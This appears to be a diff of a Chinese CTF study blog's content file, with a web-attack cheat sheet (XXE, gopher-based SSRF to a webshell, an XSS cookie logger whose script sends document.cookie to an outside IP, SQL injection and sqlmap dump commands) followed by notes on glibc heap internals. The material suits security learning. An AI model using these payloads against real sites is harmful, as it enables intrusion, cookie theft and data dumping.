+ <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="2-SSRF">2. SSRF</h2>
+<h3 id="函数的注意点">函数的注意点</h3>
+<h4 id="1-cURL">1. cURL</h4>
+<h4 id="2-file-get-contents">2. file_get_contents</h4>
+<ul>
+<li>gopher 协议无法URLencode</li>
+<li>关于gopher的302跳转有bug，导致利用失败</li>
+</ul>
+<a id="more"></a>
+<h3 id="一个有趣的域名">一个有趣的域名</h3>
+<p><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a> - 这个域名在bypass WAF时可能会有点作用<br>
+以下是简介</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What is xip.io?</span><br><span class="line">xip.io is a magic domain name that provides wildcard DNS</span><br><span class="line">for any IP address. Say your LAN IP address is 10.0.0.1.</span><br><span class="line">Using xip.io,</span><br><span class="line"></span><br><span class="line">          10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">      www.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line"></span><br><span class="line">...and so on. You can use these domains to access virtual</span><br><span class="line">hosts on your development web server from devices on your</span><br><span class="line">local network, like iPads, iPhones, and other computers.</span><br><span class="line">No configuration required!</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：windows清除本地DNS缓存的命令为<br>
+ipconfig/flusdns<br>
+（别问我为什么要给出来，相信我，你一定会用上的 <strong>XD</strong>)</p>
+</blockquote>
+<h3 id="1-file协议">1. file协议</h3>
+<blockquote>
+<p>file://localhost/etc/passwd 能够读取到 /etc/passwd 的内容，同时这种情况会忽略 host</p>
+</blockquote>
+<h3 id="2-gopher协议">2. gopher协议</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;_&#123;body&#125;</span><br></pre></td></tr></table></figure>
+<p>使用方法：</p>
+<ol>
+<li>
+<p>首先构造 POST 的 payload</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>然后构造整个 HTTP 请求（ <strong>Content-Length不能少</strong> ）<br>
+注意:</p>
+<ul>
+<li>每个冒号后面都有一个空格</li>
+<li>http头和携带的请求数据之间间隔一个空行</li>
+<li>所有的换行都是 <strong>'\r\n’</strong></li>
+<li>分号一定要用 <code>%3B</code></li>
+<li>Content-Length 是 html报文中 body的长度（URL编码前） ， 不包括报头
+<ul>
+<li>Content-Length一定要设置正确，否则会返回http 400错误</li>
+</ul>
+</li>
+</ul>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>加上协议的其他部分</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>url 编码 （有些部分需要二次编码，例如<code>%0d %0a %20 分别编码为 %250d %250a %2520</code>）</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fwebshe11231231231.php%2520HTTP%2F1.1%250D%250AHost%3A%2520127.0.0.1%250D%250AUser-Agent%3A%2520curl%2F7.43.0%250D%250AAccept%3A%2520*%2F*%250D%250AContent-Length%3A%252034%250D%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250D%250A%250D%250Aadmin%3Dh1admin%26hacker%3Dsystem(%22ls%22)%3B</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>访问该地址得到目录下的文件</p>
+</li>
+</ol>
+<h2 id="3-xss攻击">3. xss攻击</h2>
+<ul>
+<li>
+<p>源码</p>
+  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>( $_GET[<span class="string">"code"</span>]))</span><br><span class="line">    $cookie = $_GET[<span class="string">"code"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $cookie = <span class="string">"no_cookies"</span>;</span><br><span class="line">$time = date(<span class="string">'Y-m-d g:i:s'</span>);</span><br><span class="line">$fp = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($fp, <span class="string">"Date: "</span>.$time.<span class="string">" Cookie:"</span>.$cookie.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Visited"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  &lt;script&gt;document.location="http://222.186.150.131:37992/index.php?code="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>有趣的域名</p>
+<ul>
+<li>倘若自己没有独立的服务器， 或不能内网穿透，可以试试这个域名
+<ul>
+<li><a href="http://ceye.io" target="_blank" rel="noopener">ceye.io</a></li>
+</ul>
+</li>
+<li>这个网站会记录下发送到个人子域名的所有http流量，如此便可以得到返回的cookie</li>
+</ul>
+</li>
+</ul>
+<p>在console窗口中输入如下代码刷新页面即可设置新cookies</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">document.cookie="keyName=cookeiValue";</span><br></pre></td></tr></table></figure>
+<h2 id="4-⽂件包含-伪协议-base64-解码">4. ⽂件包含+伪协议 base64 解码</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="5-SQL">5. SQL</h2>
+<ol>
+<li>
+<p>sql 注入</p>
+<blockquote>
+<p>注意点：<br>
+在地址栏输入<code>#</code>时，应尽量改写成<code>%23</code>，原因是<code>#</code>在地址栏中有特殊的含义<br>
+在地址栏输入空格<code> </code>时，应尽量改写成<code>%20</code>或<code>+</code></p>
+</blockquote>
+<ol>
+<li>
+<p>常用过WAF的套路</p>
+<ol>
+<li>
+<p>空格过滤</p>
+<ul>
+<li>用注释符<code>/**/</code></li>
+</ul>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1'<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span><span class="keyword">select</span><span class="comment">/*1*/</span><span class="keyword">database</span>();<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li>
+<p>常用语句</p>
+<ol>
+<li>
+<p>判断当前表的列数</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">order by 列数 %23</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取当前数据库名</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取所有数据库名</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取指定数据库的表名</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取指定数据表的列名（字段名）</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> <span class="keyword">and</span> table_name=<span class="string">'表名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取指定数据表指定字段的全部数据（使用<code>where</code>指定单一数据）</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表名 %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>修改指定数据表指定字段的数据（使用<code>where</code>指定单一数据）</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">; <span class="keyword">UPDATE</span> 表名 <span class="keyword">set</span> 字段=内容 <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>
+<p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">Sqli-labs</a></p>
+</li>
+<li>
+<p>sqlmap常用语法</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">检查注入点：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11</span><br><span class="line"></span><br><span class="line">爆所有数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs</span><br><span class="line"></span><br><span class="line">爆当前数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --current-db</span><br><span class="line"></span><br><span class="line">指定库名列出所有表</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 --tables # &#39;vhost48330&#39; 为指定数据库名称</span><br><span class="line"></span><br><span class="line">指定库名表名列出所有字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin --columns# &#39;admin&#39; 为指定表名称</span><br><span class="line"></span><br><span class="line">指定库名表名字段dump出指定字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump# &#39;ac,id,password&#39; 为指定字段名称</span><br><span class="line"></span><br><span class="line">各种过WAF的tamper脚本</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --tamper&#x3D;&quot;space2plus.py,hex2char.py&quot;</span><br><span class="line"></span><br><span class="line">使用多线程</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --thread&#x3D;10</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>其他</p>
+<ol>
+<li><strong>information_schema</strong> 数据库表说明:
+<ul>
+<li>SCHEMATA 表：提供了当前 mysql 实例中所有数据库的信息。<code>show databases</code> 的结果取之此表。</li>
+<li>TABLES 表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个 schema，表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code> 的结果取之此表。</li>
+<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code> 的结果取之此表。</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>常用 sql 语法</p>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UNION 操作符用于合并两个或多个 <span class="keyword">SELECT</span> 语句的结果集。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="6-php">6. php</h2>
+<ol>
+<li>
+<p>php 超全局变量</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_REQUEST</span><br><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>md5 碰撞 =&gt; 利用 php 弱类型</p>
+</li>
+</ol>
+<ul>
+<li>0e 纯数字的字符串在判断相等的时候会被认为是科学计数法的数字，⽐较时⾸先会做字符串到数字的转换。</li>
+<li>转换后都成为了 0 的 n 次⽅，相等。</li>
+<li>md5 以 0e 开头的字符例子： <code>QNKCDZO</code> <code>240610708</code></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF Reverse 的笔记</title>
     <url>/2020/04/reverse/</url>
     <content><![CDATA[<ul>
@@ -14358,6 +14358,92 @@ numbwritten 是指 printf 在格式化字符串之前输出的数据，比如 pr
 <p>所有的分析都以注释的形式添加进源代码中，方便阅读</p>
 </blockquote>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;  <span class="comment">// 指向arena的指针</span></span><br><span class="line">  <span class="keyword">void</span> *victim;   <span class="comment">// 指向待分配chunk的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断 __malloc_hook 是否为空</span></span><br><span class="line">  <span class="comment">// 如果不为空，则返回 其执行 __malloc_hook指向函数的返回值</span></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取arena并上线程锁</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行核心内存分配函数，并获得所分配的chunk地址</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前arena不为空，但分配不到chunk</span></span><br><span class="line">  <span class="comment">// 则更换可用arena并尝试重新分配chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果arena不为空，则解除arena上的线程锁</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断条件，若不满足指定条件则断言出错</span></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn</tag>
+        <tag>Heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>heap - 4 - _int_malloc的相关操作</title>
+    <url>/2020/04/heap-4-_int_malloc_process/</url>
+    <content><![CDATA[<p>_int_malloc的一系列操作</p>
+<a id="more"></a>
+<blockquote>
+<p>注意！ 以下步骤若未明确标明退出函数，则表示在执行完当前操作后，继续执行剩余操作</p>
+</blockquote>
+<h2 id="1-判断arena是否为空">1. 判断arena是否为空</h2>
+<ul>
+<li>如果是，则调用sysmalloc分配所需内存，<strong>返回并退出</strong></li>
+</ul>
+<h2 id="2-判断所申请的chunk大小是否小于fast-chunk的最大值">2. 判断所申请的chunk大小是否小于fast chunk的最大值</h2>
+<ul>
+<li>如果是，则尝试取出fast bin里的第一个chunk(<code>fastbin-&gt;fd</code>)</li>
+<li>如果该chunk不为空，则检查该chunk是否出错、 <strong>返回该chunk用户地址并退出</strong></li>
+</ul>
+<h2 id="3-判断所申请的chunk大小是否小于small-chunk的最大值">3. 判断所申请的chunk大小是否小于small chunk的最大值</h2>
+<ul>
+<li>如果是，并且指向small bin最后一个chunk的指针（<code>smallbin-&gt;bk</code>）不指向small bin自己，则判断该指针是否为NULL
+<ul>
+<li>如果是，则说明此时是第一次执行该部分代码，则执行<code>malloc_consolidate</code>函数</li>
+<li>否则，则说明small bin上存在可用chunk，检查该chunk是否出错、将该chunk取出， <strong>返回该chunk用户地址并退出</strong></li>
+</ul>
+</li>
+</ul>
+<h2 id="4-取出largebin的索引，并判断是否有空闲的fastchunk">4. 取出largebin的索引，并判断是否有空闲的fastchunk</h2>
+<ul>
+<li>如果有，则执行<code>malloc_consolidate</code>函数</li>
+</ul>
+<h2 id="5-进入大型循环——for循环">5. 进入大型循环——for循环</h2>
+<h3 id="1-遍历unsortedbin里的chunk最多10000次，并执行以下操作">1. 遍历unsortedbin里的chunk最多10000次，并执行以下操作</h3>
+<ol>
+<li>检测该chunk的大小是否非常小或非常大
+<ul>
+<li>如果是，输出错误信息并 <strong>退出</strong></li>
+</ul>
+</li>
+<li>判断用户申请的大小是否同时满足以下3个条件
+<ol>
+<li>在smallchunk的范围内</li>
+<li>unsorted bin里只有一个chunk</li>
+<li>并且该chunk是last_remainder</li>
+</ol>
+<ul>
+<li>如果是，则切割last_remainder,并将剩余remainder放回unsortedbin里、重设last_remainder、检查chunk，最后 <strong>返回该chunk的用户地址并退出</strong></li>
+</ul>
+</li>
+<li>如果这块chunk刚好与所申请的chunk大小相等，则取出该chunk、检查chunk、 <strong>返回该chunk的用户地址并退出</strong></li>
+<li>将遍历到的chunk根据大小放置进small bin或large bin里</li>
+</ol>
+<h3 id="2-尝试在large-bin里搜索可用的chunk">2. 尝试在large bin里搜索可用的chunk</h3>
+<ul>
+<li>如果large bin里，size最大的chunk，其size小于所申请的内存大小
+<ol>
+<li>取出large bin里，size最接近所申请chunk的chunk</li>
+<li>判断该chunk和所申请内存大小相差是否小于MINSIZE
+<ul>
+<li>如果是，则多出的这块内存一并附赠给用户</li>
+<li>否则，分割这块chunk，将剩余的chunk放入unsorted bin里、检查目标chunk、<strong>返回该chunk的用户地址并退出</strong></li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="3-在其他free-chunks大小更大的bin里找更大的内存">3. 在其他free chunks大小更大的bin里找更大的内存</h3>
+<ul>
+<li>由于fastbin、smallbin、largebin上的freechunk是分组的，所以可能出现目标组别上的freechunk无法满足大小，此时使用binmap，去其他更大的bins里查找freechunk</li>
+</ul>
+<h3 id="4-如果执行到了这里，那就真是什么freechunk都找不到了，则判断top-chunk是否够用">4. 如果执行到了这里，那就真是什么freechunk都找不到了，则判断top chunk是否够用</h3>
+<ol>
+<li>如果够用，切割top chunk并使用</li>
+<li>否则，则判断是否有fast chunk空闲
+<ul>
+<li>如果有，则执行<code>malloc_consolidate</code>函数，然后 <strong>返回for循环起点，重新执行相关代码</strong></li>
+<li>否则，调用sysmalloc申请内存，<strong>返回该chunk的用户地址并退出</strong></li>
+</ul>
+</li>
+</ol>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -15067,92 +15153,6 @@ numbwritten 是指 printf 在格式化字符串之前输出的数据，比如 pr
       </tags>
   </entry>
   <entry>
-    <title>heap - 4 - _int_malloc的相关操作</title>
-    <url>/2020/04/heap-4-_int_malloc_process/</url>
-    <content><![CDATA[<p>_int_malloc的一系列操作</p>
-<a id="more"></a>
-<blockquote>
-<p>注意！ 以下步骤若未明确标明退出函数，则表示在执行完当前操作后，继续执行剩余操作</p>
-</blockquote>
-<h2 id="1-判断arena是否为空">1. 判断arena是否为空</h2>
-<ul>
-<li>如果是，则调用sysmalloc分配所需内存，<strong>返回并退出</strong></li>
-</ul>
-<h2 id="2-判断所申请的chunk大小是否小于fast-chunk的最大值">2. 判断所申请的chunk大小是否小于fast chunk的最大值</h2>
-<ul>
-<li>如果是，则尝试取出fast bin里的第一个chunk(<code>fastbin-&gt;fd</code>)</li>
-<li>如果该chunk不为空，则检查该chunk是否出错、 <strong>返回该chunk用户地址并退出</strong></li>
-</ul>
-<h2 id="3-判断所申请的chunk大小是否小于small-chunk的最大值">3. 判断所申请的chunk大小是否小于small chunk的最大值</h2>
-<ul>
-<li>如果是，并且指向small bin最后一个chunk的指针（<code>smallbin-&gt;bk</code>）不指向small bin自己，则判断该指针是否为NULL
-<ul>
-<li>如果是，则说明此时是第一次执行该部分代码，则执行<code>malloc_consolidate</code>函数</li>
-<li>否则，则说明small bin上存在可用chunk，检查该chunk是否出错、将该chunk取出， <strong>返回该chunk用户地址并退出</strong></li>
-</ul>
-</li>
-</ul>
-<h2 id="4-取出largebin的索引，并判断是否有空闲的fastchunk">4. 取出largebin的索引，并判断是否有空闲的fastchunk</h2>
-<ul>
-<li>如果有，则执行<code>malloc_consolidate</code>函数</li>
-</ul>
-<h2 id="5-进入大型循环——for循环">5. 进入大型循环——for循环</h2>
-<h3 id="1-遍历unsortedbin里的chunk最多10000次，并执行以下操作">1. 遍历unsortedbin里的chunk最多10000次，并执行以下操作</h3>
-<ol>
-<li>检测该chunk的大小是否非常小或非常大
-<ul>
-<li>如果是，输出错误信息并 <strong>退出</strong></li>
-</ul>
-</li>
-<li>判断用户申请的大小是否同时满足以下3个条件
-<ol>
-<li>在smallchunk的范围内</li>
-<li>unsorted bin里只有一个chunk</li>
-<li>并且该chunk是last_remainder</li>
-</ol>
-<ul>
-<li>如果是，则切割last_remainder,并将剩余remainder放回unsortedbin里、重设last_remainder、检查chunk，最后 <strong>返回该chunk的用户地址并退出</strong></li>
-</ul>
-</li>
-<li>如果这块chunk刚好与所申请的chunk大小相等，则取出该chunk、检查chunk、 <strong>返回该chunk的用户地址并退出</strong></li>
-<li>将遍历到的chunk根据大小放置进small bin或large bin里</li>
-</ol>
-<h3 id="2-尝试在large-bin里搜索可用的chunk">2. 尝试在large bin里搜索可用的chunk</h3>
-<ul>
-<li>如果large bin里，size最大的chunk，其size小于所申请的内存大小
-<ol>
-<li>取出large bin里，size最接近所申请chunk的chunk</li>
-<li>判断该chunk和所申请内存大小相差是否小于MINSIZE
-<ul>
-<li>如果是，则多出的这块内存一并附赠给用户</li>
-<li>否则，分割这块chunk，将剩余的chunk放入unsorted bin里、检查目标chunk、<strong>返回该chunk的用户地址并退出</strong></li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-<h3 id="3-在其他free-chunks大小更大的bin里找更大的内存">3. 在其他free chunks大小更大的bin里找更大的内存</h3>
-<ul>
-<li>由于fastbin、smallbin、largebin上的freechunk是分组的，所以可能出现目标组别上的freechunk无法满足大小，此时使用binmap，去其他更大的bins里查找freechunk</li>
-</ul>
-<h3 id="4-如果执行到了这里，那就真是什么freechunk都找不到了，则判断top-chunk是否够用">4. 如果执行到了这里，那就真是什么freechunk都找不到了，则判断top chunk是否够用</h3>
-<ol>
-<li>如果够用，切割top chunk并使用</li>
-<li>否则，则判断是否有fast chunk空闲
-<ul>
-<li>如果有，则执行<code>malloc_consolidate</code>函数，然后 <strong>返回for循环起点，重新执行相关代码</strong></li>
-<li>否则，调用sysmalloc申请内存，<strong>返回该chunk的用户地址并退出</strong></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Pwn</tag>
-        <tag>Heap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>heap - 3 - bins分类</title>
     <url>/2020/04/heap-3-bins/</url>
     <content><![CDATA[<p>存放free chunks的链表 ——— bins !</p>
@@ -15379,6 +15379,40 @@ bins --> large[Large bins]</pre>
       </tags>
   </entry>
   <entry>
+    <title>heap - 1 - arena</title>
+    <url>/2020/03/heap-1-arena/</url>
+    <content><![CDATA[<p>堆的 <strong>管理者</strong></p>
+<h2 id="1-什么是-arena">1. 什么是 arena</h2>
+<p>堆，是内存分配所用的内存，在计算机世界中是一种比较复杂的部件，里面有大量的信息需要被管理<br>
+而<code>arena</code>，就是管理堆的一个结构</p>
+<h2 id="2-arena-的特点">2. arena 的特点</h2>
+<p>一个线程只有一个<code>arena</code>，这些<code>arena</code>是互不相同的。<br>
+主线程的<code>arena</code>称为<code>main_arena</code>，子线程的<code>arena</code>称为<code>thread_arena</code>。</p>
+<a id="more"></a>
+<h2 id="3-arena-的数量限制">3. arena 的数量限制</h2>
+<p>并不是每个线程都有一个<code>arena</code>，其个数是有限制的。</p>
+<blockquote>
+<p>由于笔者在写这篇文章时，所涉猎的堆漏洞类型暂时没有涉及arena的其他知识，故此处留坑。</p>
+</blockquote>
+<h2 id="4-arena-的实现">4. arena 的实现</h2>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ----------- Internal state representation and initialization -----------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>glibc中的<code>arena</code>使用的就是此结构体。</li>
+<li>该结构体包含了各种信息，例如<code>bin</code>链的头地址、<code>topchunk</code>的地址以及<code>last remainder</code>地址等等</li>
+<li>成员binmap用于记录bin的相关信息，例如某个bin是否为空
